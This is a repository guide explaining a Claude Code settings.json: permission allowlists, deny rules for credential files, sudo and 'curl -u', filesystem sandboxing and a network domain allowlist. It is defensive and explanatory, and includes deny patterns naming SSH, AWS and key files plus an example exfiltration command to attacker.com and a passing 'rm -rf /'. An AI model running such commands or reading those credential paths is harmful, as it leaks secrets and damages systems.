# Claude Code Settings Guide

This document explains the security and productivity settings configured in `.claude/settings.json` for this repository, based on **Anthropic's official best practices**.

## Overview

This project uses a **permission-based security model** combined with **OS-level sandboxing**. Claude Code only performs actions you explicitly grant in `settings.json`, and the sandbox prevents accidental system damage.

---

## Configuration Breakdown

### 1. Model & Default Mode

```json
"model": "claude-opus-4-1",
"defaultMode": "plan"
```

- **Model:** Uses the latest Claude Opus (most capable model) for complex reasoning and coding tasks
- **Default Mode:** Starts in `plan` mode, requiring approval before implementation. This is the secure default—you see the plan before code is written.

---

### 2. Permission Allowlist (Pre-Approved Safe Operations)

```json
"permissions": {
  "allow": [
    "Bash(git *)",
    "Edit(docs/**)",
    "Edit(CLAUDE.md)",
    "Edit(.claude/**)",
    "Read(.)"
  ]
}
```

These operations **don't require approval**:
- **Git operations** — commit, push, pull, diff, log (version control)
- **Docs editing** — modify Markdown files in `docs/`
- **Project configuration** — update CLAUDE.md and `.claude/` settings
- **File reading** — browse the project freely

**Why this is safe:** Git operations are reversible; docs edits don't affect production; reading is harmless.

---

### 3. Permission Blocklist (Explicit Denials)

```json
"permissions": {
  "deny": [
    "Read(.env*)",
    "Read(secrets/**)",
    "Read(~/.aws/**)",
    "Read(~/.ssh/**)",
    "Read(**/*.key)",
    "Read(**/*.pem)",
    "Bash(sudo *)",
    "Bash(curl -u *)"
  ]
}
```

These operations are **always blocked**:

| Blocked | Reason |
|---------|--------|
| `.env`, `secrets/`, AWS credentials | Prevents accidental exposure of API keys and secrets |
| SSH keys (`.ssh/`, `.pem`, `.key` files) | Prevents unauthorized access to remote systems |
| `sudo` commands | Prevents accidental privilege escalation |
| `curl -u` (authenticated requests) | Prevents embedding credentials in visible commands |

**Security principle:** Even if Claude Code is asked to "automate deployments," it cannot steal credentials or escalate privileges. The deny list is a hard boundary.

---

### 4. Sandboxing (OS-Level Isolation)

```json
"sandbox": {
  "enabled": true,
  "autoAllowBashIfSandboxed": true,
  "filesystem": {
    "denyWrite": ["/etc", "/usr/bin", "/system", "/root"],
    "denyRead": ["~/.aws", "~/.ssh", "~/.kube"],
    "allowRead": ["."]
  },
  "network": {
    "allowedDomains": ["github.com", "api.github.com", "npmjs.com"]
  }
}
```

**Filesystem isolation:**
- **denyWrite:** Claude Code cannot modify system directories. Even if given `Bash(rm -rf /)` permission, the sandbox prevents it.
- **denyRead:** Sensitive home directories are off-limits.
- **allowRead:** Free access to the project directory.

**Network isolation:**
- Only allows outbound connections to safe domains (GitHub, npm registry)
- Prevents exfiltration of data to attacker-controlled servers
- Blocks commands like `curl https://attacker.com --data secrets.txt`

**Auto-approval within sandbox:**
- `autoAllowBashIfSandboxed: true` means: If you approve a bash command and the sandbox confirms it's safe, run it without re-prompting
- Reduces "approval fatigue" while maintaining safety

---

### 5. Specific Security Patterns

#### A. No Credential Embedding
```json
"Bash(curl -u *)"  // Denied
```
Even if you ask "Use curl with my password to fetch data," Claude Code can't do it. You must authenticate differently (e.g., OAuth tokens in environment).

#### B. No Privilege Escalation
```json
"Bash(sudo *)"  // Denied
```
Forces intentional decisions. Need root access? You have to manually `sudo` in your terminal, not delegate to Claude Code.

#### C. Read-Only by Default
```json
"Read(.)"  // Allowed (open)
"Edit(docs/**)"  // Restricted (docs only)
```
Claude can freely read any file but can only edit specific directories. This prevents accidental overwrites.

---

## Why This Setup Works for Interview Prep

This repository is a **learning/documentation project**, not production infrastructure. The settings reflect that:

✅ **Allow:**
- Editing learning materials (`docs/`, CLAUDE.md)
- Version control (git)
- Reading the project freely

✅ **Block:**
- Credential access (you may have AWS/SSH keys on your machine)
- Privilege escalation (doesn't need root to edit markdown)
- Risky network operations

This creates an ideal environment for **interview preparation work** without worrying about accidentally:
- Leaking credentials
- Modifying system files
- Accessing private keys

---

## How to Extend Permissions

If you need to do something not covered (e.g., run a test script), you can:

### Option 1: Temporarily Allow in settings.json
```json
"allow": [
  "Bash(bash scripts/test.sh)"  // Add this
]
```
Then commit the change to git for team consistency.

### Option 2: User-Level Settings (Personal)
Create `~/.claude/settings.json` (your home directory) for personal overrides:
```json
{
  "permissions": {
    "allow": [
      "Bash(docker *)"
    ]
  }
}
```
This doesn't affect the project, only your personal Claude Code usage.

### Option 3: Manual Approval
Leave it as-is and approve individual commands when Claude Code asks.

---

## Permission Modes Explained

| Mode | Behavior | Use Case |
|------|----------|----------|
| **Plan** | Shows the plan, requires approval before implementation | Default; safest |
| **Auto** | Pre-approves operations matching your allowlist | For trusted, routine tasks |
| **Manual** | Asks for approval on every operation | Maximum control but slower |

You can override per-conversation by setting `defaultMode: "auto"` in settings.json, but **"plan" is the official Anthropic recommendation for security**.

---

## Official References

These settings follow Anthropic's published guidance:
- **Settings documentation:** https://code.claude.com/docs/en/settings.md
- **Security best practices:** https://code.claude.com/docs/en/security.md
- **Sandboxing:** https://code.claude.com/docs/en/sandboxing.md

---

## Maintenance Notes

- **Review permissions yearly** if the project scope changes
- **Keep deny list current** if new sensitive files are added (e.g., `.envrc`, `secrets.yaml`)
- **Test sandbox limits** if you hit unexpected blocks ("I wanted to allow X but it's denied")
- **Commit `settings.json` to git** so all collaborators have consistent security baselines

---

## Checklist: Did You Get Security Right?

- ✅ Secrets are in deny list (`.env*`, `secrets/`, `*.key`)
- ✅ Privilege escalation is blocked (`sudo` denied)
- ✅ Credential embedding is blocked (`curl -u` denied)
- ✅ Sandbox prevents system writes
- ✅ Network is restricted to safe domains
- ✅ Read access is open (for code review)
- ✅ Write access is scoped to project files
- ✅ Default mode is "plan" (requires approval)

All boxes checked! You're following Anthropic's official security playbook.
